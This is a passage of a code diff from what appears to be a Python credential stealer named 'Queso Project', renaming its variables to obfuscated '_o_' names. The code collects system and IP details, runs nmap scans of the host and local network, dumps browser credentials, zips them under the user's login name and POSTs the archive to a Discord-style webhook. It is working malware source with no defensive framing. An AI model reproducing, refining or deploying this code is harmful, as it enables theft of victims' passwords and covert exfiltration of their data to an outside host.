+                    \nISP: {_o_R['isp']}
                 """
             except Exception: # Throw an error if we can't
-                ip_info = "(No IP info)"
+                _o_IpInfo = "(No IP info)"
             else:
-                ip_info = ip_data
+                _o_IpInfo = _o_IpData
 
         # Create the embed
-        webhook_payload = {
+        _o_WebhookPayload = {
             "embeds": [
                 {
                     "title": "Queso Project",
                     "description": "**Info Gathered:**\n",
                     "footer": {
-                        "text": "Information by Queso"
+                        "text": "Information by _o_"
                     }
                 }
             ],
             "username": "Queso"
         }
 
-        if sys_info:
-            webhook_payload["embeds"][0]["description"] += f"_System Info_\n```autohotkey\n{sys_info}```\n"
-        if ip_info:
-            webhook_payload["embeds"][0]["description"] += f"_IP Info_\n```prolog\n{ip_info}```\n"
+        if _o_SystemInfo:
+            _o_WebhookPayload["embeds"][0]["description"] += f"_System Info_\n```autohotkey\n{_o_SystemInfo}```\n"
+        if _o_IpInfo:
+            _o_WebhookPayload["embeds"][0]["description"] += f"_IP Info_\n```prolog\n{_o_IpInfo}```\n"
 
-        webhook_fields = dict()
+        _o_WebhookFields = dict()
 
         # Create a dict for our zip file data
-        zip_data = {
+        _o_ZipData = {
             "xml": {},
             "txt": {}
         }
 
         if "%nmap_scan%":
-            local_scan: ElementTree = None
-            network_scan: ElementTree = None
+            _o_LocalScan: ElementTree = None
+            _o_NetworkScan: ElementTree = None
 
             # Create a scan of the host system
-            local_scan = Network.NmapScan("127.0.0.1")
-            if local_scan:
-                zip_data['xml']['localhost'] = local_scan
+            _o_LocalScan = _o_Network._o_NmapScan("127.0.0.1")
+            if _o_LocalScan:
+                _o_ZipData['xml']['localhost scan'] = _o_LocalScan
 
             # And a scan of the local network
-            network_scan = Network.NmapScan("192.168.1.1/24")
-            if network_scan:
-                zip_data['xml']['localnetwork'] = network_scan
+            _o_NetworkScan = _o_Network._o_NmapScan("192.168.1.1/24")
+            if _o_NetworkScan:
+                _o_ZipData['xml']['local network scan'] = _o_NetworkScan
         
         if "%steal_credentials%":
-            self.StealBrowserCreds()
-            password_file_path = os.path.join(sys._MEIPASS, "dumped_creds.txt")
-            if os.path.exists(password_file_path):
-                with open(password_file_path, "r") as password_file:
-                    zip_data['txt']['dumped_creds'] = password_file.read()
+            self._o_StealBrowserCreds()
+            _o_PasswordFilePath = os.path.join(sys._MEIPASS, "dumped_creds.txt")
+            if os.path.exists(_o_PasswordFilePath):
+                with open(_o_PasswordFilePath, "r") as _o_PasswordFile:
+                    _o_ZipData['txt']['dumped_creds'] = _o_PasswordFile.read()
 
         # Try to create a zip file and attach it if we can
-        Utility.CreateZip(zip_data)
+        _o_Utility._o_CreateZip(_o_ZipData)
         if os.path.exists(os.path.join(sys._MEIPASS, "data.zip")):
-            with open(os.path.join(sys._MEIPASS, "data.zip"), "rb") as zip_file:
-                webhook_fields['file'] = (f"{os.getlogin()}.zip", zip_file.read())
+            with open(os.path.join(sys._MEIPASS, "data.zip"), "rb") as _o_ZipFile:
+                _o_WebhookFields['file'] = (f"{os.getlogin()}.zip", _o_ZipFile.read())
 
 
-        webhook_fields['payload_json'] = json.dumps(webhook_payload).encode() # Append the embed
-        http_manager.request("POST", self.Webhook, fields= webhook_fields) # Bon voyage!
+        _o_WebhookFields['payload_json'] = json.dumps(_o_WebhookPayload).encode() # Append the embed
+        _o_HttpManager.request("POST", self._o_Webhook, fields= _o_WebhookFields) # Bon voyage!
 
 
 if os.name == "nt":
